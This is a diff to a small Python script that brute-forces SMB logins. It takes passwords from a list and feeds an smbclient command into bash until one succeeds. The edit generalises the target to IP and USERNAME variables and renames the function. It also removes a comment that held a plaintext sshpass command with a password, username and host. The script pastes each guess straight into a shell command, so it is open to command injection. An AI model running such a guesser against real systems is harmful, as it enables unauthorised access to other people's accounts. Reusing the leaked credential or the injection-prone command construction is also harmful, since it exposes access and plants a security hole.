@@ -1,8 +1,7 @@
 #!/usr/bin/env python
 
 # coding=utf-8
-# 32-126 : 20-7E
-# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics
+
 from subprocess import Popen, PIPE, check_output
 import time
 import sys
@@ -18,9 +17,7 @@ counter = 0
 guess_result = ((),)
 pw = ''
 
-# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222
-
-def connect_ssh():
+def connect_smb():
  global correct_pw
  global cracked
  global guess_result
@@ -29,7 +26,7 @@ def connect_ssh():
  while cracked == False:
   pw = get_next_pw()
   
-  arg = 'smbclient //172.16.0.30/homes -U sigurdkb'+pw
+  arg = 'smbclient //'+IP+'/homes -U '+USERNAME+' '+pw
   proc = Popen('/bin/bash', stdin=PIPE, stdout=PIPE) 
   stdout = proc.communicate(arg.encode())
   guess_result = stdout
@@ -59,4 +56,4 @@ def get_next_pw():
   counter += 1
   return l.strip('\n')
 
-connect_ssh()
+connect_smb()
